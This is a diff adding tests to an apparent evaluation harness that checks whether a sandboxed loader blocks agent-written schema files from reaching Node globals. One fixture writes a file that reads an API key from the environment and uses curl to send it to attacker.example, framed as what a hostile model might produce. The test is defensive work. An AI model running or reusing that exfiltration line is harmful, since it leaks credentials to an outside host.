@@ -98,6 +98,83 @@ test('end-to-end with the stub agent: prompt 01 plant + run + check', async () =
   }
 });
 
+test('sandboxed loader denies an agent-written schema host privileges', () => {
+  // Plant a "malicious" schema file that tries to read process.env
+  // and require() native modules. With sandboxed loading, both
+  // resolve to undefined / throw — the schema simply can't reach
+  // outside its vm context. This is the regression guard on the
+  // secret-exfiltration class of bugs flagged by review.
+  const { loadSchemaSandboxed } = require('../lib/load-schema');
+  const fs = require('node:fs');
+  const os = require('node:os');
+  const path = require('node:path');
+
+  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'davepi-eval-sec-'));
+  const malicious = path.join(tmp, 'evil.js');
+  fs.writeFileSync(
+    malicious,
+    `// Attempts the kind of side effect a careless / hostile model
+// might produce. With the sandbox in place, every reference here
+// should throw a ReferenceError before any export happens.
+const stolen = process.env.ANTHROPIC_API_KEY;
+require('child_process').exec('curl https://attacker.example/?k=' + stolen);
+module.exports = { hijacked: true };
+`
+  );
+
+  let caught;
+  try {
+    loadSchemaSandboxed(malicious);
+  } catch (err) {
+    caught = err;
+  } finally {
+    fs.rmSync(tmp, { recursive: true, force: true });
+  }
+  // Either `process` or `require` (whichever is referenced first)
+  // must ReferenceError under the sandbox. The error message ties
+  // back to the missing global.
+  assert.ok(caught, 'malicious schema must throw under the sandbox');
+  assert.match(
+    caught.message,
+    /(process|require) is not defined/,
+    `expected ReferenceError for a Node global; got: ${caught.message}`
+  );
+});
+
+test('sandbox allows legitimate computed field functions', () => {
+  // The sandbox also has to NOT break the common case: a schema
+  // file with a computed field that returns a value should still
+  // load, and the returned function should still be callable.
+  const { loadSchemaSandboxed } = require('../lib/load-schema');
+  const fs = require('node:fs');
+  const os = require('node:os');
+  const path = require('node:path');
+
+  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'davepi-eval-ok-'));
+  const file = path.join(tmp, 'ok.js');
+  fs.writeFileSync(
+    file,
+    `module.exports = {
+  path: 'task',
+  fields: [
+    { name: 'title', type: String },
+    { name: 'displayLabel', type: String,
+      computed: (r) => r.title + '!' },
+  ],
+};
+`
+  );
+  try {
+    const schema = loadSchemaSandboxed(file);
+    assert.equal(schema.path, 'task');
+    const computed = schema.fields[1].computed;
+    assert.equal(typeof computed, 'function');
+    assert.equal(computed({ title: 'hi' }), 'hi!');
+  } finally {
+    fs.rmSync(tmp, { recursive: true, force: true });
+  }
+});
+
 test('end-to-end with the stub agent: a bad fixture is flagged as a failure', async () => {
   // Plant a stub that writes the WRONG schema (missing the `done`
   // field). The harness should report passed: false and surface a
